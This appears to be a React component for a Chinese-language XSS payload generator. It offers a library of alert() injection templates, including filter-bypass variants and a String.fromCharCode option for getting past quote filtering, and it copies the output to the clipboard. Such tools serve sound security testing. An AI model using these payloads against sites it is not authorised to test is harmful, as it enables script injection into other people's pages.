import { useState, useMemo } from 'react';
import {
    Stack,
    TextInput,
    Button,
    Paper,
    Select,
    Textarea,
    Group,
    Text,
    Divider,
    Switch, Badge
} from '@mantine/core';
import { IconCopy, IconRefresh, IconBug, IconLock } from '@tabler/icons-react';
import { useClipboard } from '@mantine/hooks';
import { showNotification } from '../../utils/notifications';
import { handleAppError } from '../../utils/error';

// 主流攻击模板库
const PAYLOAD_CATEGORIES = [
    {
        group: '基础注入',
        items: [
            { value: 'basic', label: '经典 Script', template: '<script>alert({msg})</script>' },
            { value: 'img', label: 'IMG Error', template: '<img src=x onerror=alert({msg})>' },
            { value: 'svg', label: 'SVG Onload', template: '<svg onload=alert({msg})>' },
        ]
    },
    {
        group: '过滤器绕过',
        items: [
            { value: 'no_space', label: '无空格绕过', template: '<img/src="x"/onerror=alert({msg})>' },
            { value: 'tab', label: 'Tab字符绕过', template: '<svg	onload=alert({msg})>' },
            { value: 'case', label: '大小写混淆', template: '<sCrIpT>alert({msg})</sCrIpT>' },
        ]
    },
    {
        group: '交互/现代场景',
        items: [
            { value: 'autofocus', label: 'Autofocus (无交互)', template: '<input autofocus onfocus=alert({msg})>' },
            { value: 'details', label: 'Details 展开', template: '<details open ontoggle=alert({msg})>' },
            { value: 'href', label: 'JS伪协议', template: 'javascript:alert({msg})' },
            { value: 'react', label: 'React 属性注入', template: 'dangerouslySetInnerHTML={{__html: "alert({msg})"}}' },
        ]
    }
];

// 扁平化用于 Select 组件
const SELECT_DATA = PAYLOAD_CATEGORIES.map(cat => ({
    group: cat.group,
    items: cat.items.map(i => ({ value: i.value, label: i.label }))
}));

export default function XssGenerator() {
    const [msg, setMsg] = useState('XSS');
    const [type, setType] = useState<string | null>('basic');
    const [useCharCode, setUseCharCode] = useState(false);
    const clipboard = useClipboard();

    // 编码转换：绕过引号过滤的关键逻辑
    const encodeMessage = (input: string) => {
        if (!useCharCode) return `"${input}"`;
        const codes = input.split('').map(c => c.charCodeAt(0)).join(',');
        return `String.fromCharCode(${codes})`;
    };

    const generatedPayload = useMemo(() => {
        try {
            const allItems = PAYLOAD_CATEGORIES.flatMap(c => c.items);
            const selected = allItems.find(t => t.value === type);
            if (!selected) return '';

            const encodedMsg = encodeMessage(msg);
            return selected.template.replace('{msg}', encodedMsg);
        } catch (err) {
            handleAppError(err, { title: '生成失败' });
            return '';
        }
    }, [msg, type, useCharCode]);

    const handleCopy = () => {
        clipboard.copy(generatedPayload);
        showNotification({
            type: 'info',
            message: 'Payload 已复制.',
        });
    };

    return (
        <Paper p="md" withBorder>
            <Stack>
                <Group justify="space-between">
                    <Group gap="xs">
                        <IconBug size={20} color="var(--mantine-color-red-6)" />
                        <Text fw={600}>XSS Payload 生成器</Text>
                    </Group>
                    <Badge
                        variant="dot"
                        color="green"
                        size="md"
                        radius="xl"
                        styles={{ root: { textTransform: 'none' } }}
                    >
                        模板库: V1.0
                    </Badge>
                </Group>

                <Divider />

                <Group grow align="flex-start">
                    <TextInput
                        label="自定义弹窗内容"
                        placeholder="输入 alert 的内容..."
                        value={msg}
                        onChange={(e) => setMsg(e.currentTarget.value)}
                    />
                    <Select
                        label="选择攻击向量"
                        placeholder="请选择类型"
                        data={SELECT_DATA}
                        value={type}
                        onChange={setType}
                    />
                </Group>

                <Group justify="space-between" bg="var(--mantine-color-gray)" p="xs" style={{ borderRadius: '4px' }}>
                    <Text size="xs" c="dimmed">
                        <IconLock size={12} style={{ marginRight: 4 }} />
                        绕过技术：开启后将字符串转换为 <code>String.fromCharCode</code>
                    </Text>
                    <Switch
                        size="sm"
                        label="绕过引号过滤"
                        checked={useCharCode}
                        onChange={(event) => setUseCharCode(event.currentTarget.checked)}
                    />
                </Group>

                <Stack gap="xs">
                    <Text size="sm" fw={500}>生成的代码 (Payload):</Text>
                    <Textarea
                        readOnly
                        autosize
                        minRows={3}
                        value={generatedPayload}
                        styles={{
                            input: {
                                fontFamily: 'monospace',
                                fontSize: '13px',
                                color: 'var(--mantine-color-red)',
                                backgroundColor: 'var(--mantine-color-gray)'
                            }
                        }}
                    />
                </Stack>

                <Group justify="flex-end">
                    <Button
                        variant="subtle"
                        color="gray"
                        leftSection={<IconRefresh size={16} />}
                        onClick={() => { setMsg(''); setType('basic'); setUseCharCode(false); }}
                    >
                        重置
                    </Button>
                    <Button
                        color="red"
                        leftSection={<IconCopy size={16} />}
                        onClick={handleCopy}
                        disabled={!generatedPayload}
                    >
                        复制 Payload
                    </Button>
                </Group>
            </Stack>
        </Paper>
    );
}